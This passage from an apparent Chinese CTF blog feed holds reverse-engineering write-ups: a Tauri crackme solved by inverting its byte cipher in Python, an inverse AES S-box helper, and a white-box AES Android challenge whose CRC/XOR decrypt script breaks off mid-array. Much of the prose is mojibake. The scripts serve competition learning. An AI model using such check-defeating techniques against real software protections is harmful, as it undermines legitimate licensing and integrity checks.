class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/vite.svg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Tauri + Vue + Typescript App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">crossorigin</span> <span class="attr">src</span>=<span class="string">&quot;/assets/index-BsFf5qny.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">crossorigin</span> <span class="attr">href</span>=<span class="string">&quot;/assets/index-CJgrqWFO.css&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="index-BsFf5qny-js"><a href="#index-BsFf5qny-js" class="headerlink" title="index-BsFf5qny.js"></a>index-BsFf5qny.js</h3><p>ç”±äºè§£åŒ…åçš„æ–‡æœ¬æ¯”è¾ƒéš¾é˜…è¯»ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ ¼å¼åŒ–ç„¶ååˆ†æï¼Œåˆ†æåå®é™…è¿™ä¸ªjsåªæ˜¯ä¸€ä¸ªç˜¦å‰ç«¯ï¼ŒåŠŸèƒ½æç®€ã€‚çœŸæ­£çš„è§£é¢˜&#x2F;ç ´è§£é‡ç‚¹åœ¨ **Rust åç«¯å‘½ä»¤ **<code>greet</code> çš„å®ç°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ul = <span class="title class_">Ci</span>(&#123;</span><br><span class="line">    <span class="attr">__name</span>: <span class="string">&quot;App&quot;</span>,</span><br><span class="line">    <span class="title function_">setup</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> t = <span class="title class_">Qs</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">            s = <span class="title class_">Qs</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params"></span>) &#123;</span><br><span class="line">            t.<span class="property">value</span> = <span class="keyword">await</span> <span class="title function_">fl</span>(<span class="string">&quot;greet&quot;</span>, &#123;</span><br><span class="line">                <span class="attr">flag</span>: s.<span class="property">value</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="function">(<span class="params">r, i</span>) =&gt;</span> (<span class="title function_">go</span>(), <span class="title function_">bo</span>(<span class="string">&quot;main&quot;</span>, cl, [i[<span class="number">2</span>] || (i[<span class="number">2</span>] = <span class="title class_">Be</span>(<span class="string">&quot;h1&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;L3HCTF&quot;</span>, -<span class="number">1</span>)), <span class="title class_">Be</span>(<span class="string">&quot;form&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">class</span>: <span class="string">&quot;row&quot;</span>,</span><br><span class="line">            <span class="attr">onSubmit</span>: <span class="title function_">sl</span>(n, [<span class="string">&quot;prevent&quot;</span>])</span><br><span class="line">        &#125;, [<span class="title class_">Si</span>(<span class="title class_">Be</span>(<span class="string">&quot;input&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="string">&quot;greet-input&quot;</span>,</span><br><span class="line">            <span class="string">&quot;onUpdate:modelValue&quot;</span>: i[<span class="number">0</span>] || (i[<span class="number">0</span>] = <span class="function"><span class="params">o</span> =&gt;</span> s.<span class="property">value</span> = o),</span><br><span class="line">            <span class="attr">placeholder</span>: <span class="string">&quot;Enter a flag...&quot;</span></span><br><span class="line">        &#125;, <span class="literal">null</span>, <span class="number">512</span>), [</span><br><span class="line">            [ko, s.<span class="property">value</span>]</span><br><span class="line">        ]), i[<span class="number">1</span>] || (i[<span class="number">1</span>] = <span class="title class_">Be</span>(<span class="string">&quot;button&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;submit&quot;</span></span><br><span class="line">        &#125;, <span class="string">&quot;Validate&quot;</span>, -<span class="number">1</span>))], <span class="number">32</span>), <span class="title class_">Be</span>(<span class="string">&quot;p&quot;</span>, <span class="literal">null</span>, <span class="title class_">Fn</span>(t.<span class="property">value</span>), <span class="number">1</span>)]))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="greet"><a href="#greet" class="headerlink" title="greet"></a>greet</h3><p>è¯¥åŠ å¯†æµç¨‹ä»¥â€¯14â€¯å­—èŠ‚å¯†é’¥è¡¨ä¸ºæ ¸å¿ƒï¼Œå¯¹ 27â€¯å­—èŠ‚è¾“å…¥é€å­—èŠ‚æ‰§è¡Œâ€œè¡¨å€¼å¼‚æˆ– â†’ è¡¨å€¼ç›¸åŠ  â†’ å—è¡¨å€¼æ§åˆ¶çš„ 8 ä½å¾ªç¯ä½ç§» â†’ å†å¼‚æˆ–è¡¨å€¼â€å››æ­¥æ··æ·†ï¼Œæœ€ç»ˆè®©ç»“æœä¸é¢„ç½®çš„ 3 ä¸ª 64â€‘ä½é­”æ•°åŠç¬¬â€¯19â€¯å­—èŠ‚æ¯”å¯¹ï¼Œé€šè¿‡å³è§†ä¸ºå¯†é’¥æ­£ç¡®ã€‚<br>è¡¨å€¼å°±æ˜¯dGhpc2lzYWtleQ<br>æœ€åä¸‰ä¸ªå­—èŠ‚æ˜¯</p><p>ä¸¢ç»™aièƒ½ç›´æ¥ç»™å‡ºè„šæœ¬ï¼Œä½†æ˜¯è¦æ³¨æ„æœ€åä¸‰ä¸ªå­—èŠ‚çš„å¯†æ–‡éœ€è¦è‡ªå·±è‡ªè¡Œæ¨ç†æ¨ç†åæ˜¯ï¼ˆ\x4F\x32\x2Aï¼‰</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507241136556.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">S = <span class="string">b&quot;dGhpc2lzYWtleQ&quot;</span></span><br><span class="line"></span><br><span class="line">MAGIC = (</span><br><span class="line">    <span class="number">0x0A409663A025150C</span>.to_bytes(<span class="number">8</span>,  <span class="string">&#x27;little&#x27;</span>) +</span><br><span class="line">    <span class="number">0x1FE106294065165C</span>.to_bytes(<span class="number">8</span>,  <span class="string">&#x27;little&#x27;</span>) +</span><br><span class="line">    <span class="number">0xFC020A4C0E2C7290</span>.to_bytes(<span class="number">8</span>,  <span class="string">&#x27;little&#x27;</span>) +</span><br><span class="line">    <span class="string">b&#x27;\x4F\x32\x2A&#x27;</span>               <span class="comment"># æœ«å°¾ &quot;O2*&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotr8</span>(<span class="params">x, r</span>): </span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">8</span> - r))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">buf: <span class="built_in">bytearray</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">27</span>)):</span><br><span class="line">        idx1 = (<span class="number">2</span> * i + <span class="number">1</span>) % <span class="number">14</span></span><br><span class="line">        r    = S[(i + <span class="number">3</span>) % <span class="number">14</span>] &amp; <span class="number">7</span></span><br><span class="line">        tmp  = buf[i] ^ S[(i + <span class="number">4</span>) % <span class="number">14</span>]</span><br><span class="line">        tmp  = rotr8(tmp, r)</span><br><span class="line">        buf[i] = (tmp - S[idx1]) &amp; <span class="number">0xFF</span> ^ S[i % <span class="number">14</span>]</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">plain = decrypt(<span class="built_in">bytearray</span>(MAGIC))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åå…­è¿›åˆ¶:&quot;</span>, plain.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII    :&quot;</span>, plain.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é€Ÿé€šç»“å±€ï¼š"><a href="#é€Ÿé€šç»“å±€ï¼š" class="headerlink" title="é€Ÿé€šç»“å±€ï¼š"></a>é€Ÿé€šç»“å±€ï¼š</h2><p>å¾ˆå·§åˆçš„ä½ æœç´¢äº†wrongï¼Œä½ çœ‹åˆ°äº†ä¸ºwrong_answerï¼Œç›´æ¥è·Ÿè¿›åˆ°äº†é€»è¾‘ä¸»è¦å‡½æ•°ï¼Œç„¶åç›´æ¥aiä¸€æŠŠæ¢­</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tauri </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€AESã€‘aesè§£å¯†å°è„šæœ¬</title>
      <link href="/2025/08/01/aes%E7%9B%B8%E5%85%B3/"/>
      <url>/2025/08/01/aes%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="aesè§£å¯†å°è„šæœ¬"><a href="#aesè§£å¯†å°è„šæœ¬" class="headerlink" title="aesè§£å¯†å°è„šæœ¬"></a>aesè§£å¯†å°è„šæœ¬</h1><p>è®¡ç®—é€†sç›’</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES Sç›’</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> S_BOX[<span class="number">16</span>][<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">uint8_t</span> InvS[<span class="number">16</span>][<span class="number">16</span>] = &#123;&#123;<span class="number">0</span>&#125;&#125;; <span class="comment">// é€†Sç›’åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”Ÿæˆé€†Sç›’</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint8_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint8_t</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> value = S_BOX[i][j];</span><br><span class="line">        <span class="type">uint8_t</span> row = value &gt;&gt; <span class="number">4</span>;      <span class="comment">// é«˜4ä½ä½œä¸ºè¡Œç´¢å¼•</span></span><br><span class="line">        <span class="type">uint8_t</span> col = value &amp; <span class="number">0x0F</span>;    <span class="comment">// ä½4ä½ä½œä¸ºåˆ—ç´¢å¼•</span></span><br><span class="line">        InvS[row][col] = (i &lt;&lt; <span class="number">4</span>) | j; <span class="comment">// ç»„åˆåŸå§‹ä½ç½®</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°ç”Ÿæˆçš„é€†Sç›’ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AES Inverse S-Box:\n&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;    0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F\n&quot;);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;%X: &quot;, i);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, InvS[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ—æ··åˆï¼ˆMixColumnsï¼‰ï¼Œè¿™é‡Œå¤šæ•°ä¼šå¤šåŠ ä¸€æ¬¡å¼‚æˆ–è¿›è¡Œé­”æ”¹</p>]]></content>
      
      
      
        <tags>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€das25ä¸ŠåŠå¤ç°ã€‘ã€ç™½ç›’AESã€‘ç™½ç›’aesåˆè¯†â€”â€”CTFapp</title>
      <link href="/2025/07/30/%5Bdas%E4%B8%8A%E5%8D%8A%5Dez_app/"/>
      <url>/2025/07/30/%5Bdas%E4%B8%8A%E5%8D%8A%5Dez_app/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€das25-ä¸ŠåŠå¤ç°ã€‘ã€ç™½ç›’-AESã€‘ç™½ç›’-aes-åˆè¯†â€”â€”CTFapp"><a href="#ã€das25-ä¸ŠåŠå¤ç°ã€‘ã€ç™½ç›’-AESã€‘ç™½ç›’-aes-åˆè¯†â€”â€”CTFapp" class="headerlink" title="ã€das25 ä¸ŠåŠå¤ç°ã€‘ã€ç™½ç›’ AESã€‘ç™½ç›’ aes åˆè¯†â€”â€”CTFapp"></a>ã€das25 ä¸ŠåŠå¤ç°ã€‘ã€ç™½ç›’ AESã€‘ç™½ç›’ aes åˆè¯†â€”â€”CTFapp</h1><p>å¸¸è§„æµç¨‹ï¼Œå‘ç°å£°æ˜äº† native å±‚æ–¹æ³• check å’Œ getï¼Œå»æŸ¥çœ‹ so æ–‡ä»¶ã€‚æ ¹æ®å®‰è£…åŒ…çš„åå­—æˆ‘ä»¬åº”è¯¥æŸ¥çœ‹ arm æ¶æ„çš„ so å¯èƒ½ä¼šå¥½ä¸€äº›ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507300937603.png" alt="image-20250730093719535"></p><p>æ‰“å¼€ä¹‹ååˆæˆ‘ä»¬å‘ç° JNI_Onload ä¹‹ä¸­å’Œå…¶ä»–å‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼Œé˜»æ­¢ ida çš„åˆ†æï¼Œæ¸…é™¤èŠ±æŒ‡ä»¤ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿåˆ° check å‡½æ•°ä¸­çš„åŠ å¯†å‡½æ•°å¤„ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507300942060.png" alt="image-20250730094251037"></p><p>å…¶ä¸­ s1 å°±æ˜¯å¯†æ–‡ï¼Œç»å†äº†ç™½ç›’ aes åŠ å¯†å’Œ crc ç™½åŒ–ï¼Œå…ˆæŠŠå¯†æ–‡è¿›è¡Œ crc è§£å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CRC32æŸ¥æ‰¾è¡¨</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> crc32_table[<span class="number">256</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> table_initialized = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–CRC32æŸ¥æ‰¾è¡¨ (å¯¹åº”Java_com_example_test_MainActivity_Getå‡½æ•°)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_crc32_table</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!table_initialized)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> crc = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (crc &amp; <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    crc = (crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    crc &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            crc32_table[i] = crc;</span><br><span class="line">        &#125;</span><br><span class="line">        table_initialized = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CRC32è®¡ç®—å‡½æ•° (å¯¹åº”sub_3750å‡½æ•°)</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">calculate_crc32</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    init_crc32_table();</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> *bytes = (<span class="type">const</span> <span class="type">uint8_t</span> *)data;</span><br><span class="line">    <span class="type">uint32_t</span> crc = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        crc = crc32_table[(crc ^ bytes[i]) &amp; <span class="number">0xFF</span>] ^ (crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// XORè§£å¯†å‡½æ•° (å¯¹åº”sub_37F0å‡½æ•°)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor_decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *input, <span class="type">uint8_t</span> *output, <span class="type">size_t</span> length, <span class="type">uint32_t</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> crc_key = calculate_crc32(&amp;key, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        output[i] = input[i] ^ ((crc_key &gt;&gt; (<span class="number">8</span> * (i &amp; <span class="number">3</span>))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£å¯†ä¸»å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_data</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *encrypted_data, <span class="type">uint8_t</span> *decrypted_data, <span class="type">size_t</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨é¢˜ç›®ä¸­çš„å¯†é’¥ 0x6C6F7665 (&quot;love&quot;çš„ASCII)</span></span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x6C6F7665</span>;</span><br><span class="line">    xor_decrypt(encrypted_data, decrypted_data, length, key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯•å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ä»é¢˜ç›®ä¸­æå–çš„åŠ å¯†æ•°æ®</span></span><br><span class="line">    <span class="type">uint8_t</span> encrypted_data1[] = &#123;</span><br><span class="line">        <span class="number">0x0B</span>, <span class="number">0xCF</span>, <span class="number">0x79</span>, <span class="number">0x7E</span>, <span class="number">0xC7</span>, <span class="number">0xEA</span>, <span class="number">0x5F</span>, <span class="number">0x31</span>,</span><br><span class="line">        <span class="number">0xBC</span>, <span class="number">0xEE</span>, <span class="number">0xE7</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x91</span>, <span class="number">0xAA</span>, <span class="number">0xDD</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> encrypted_data2[] = &#123;</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x07</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0x36</span>, <span 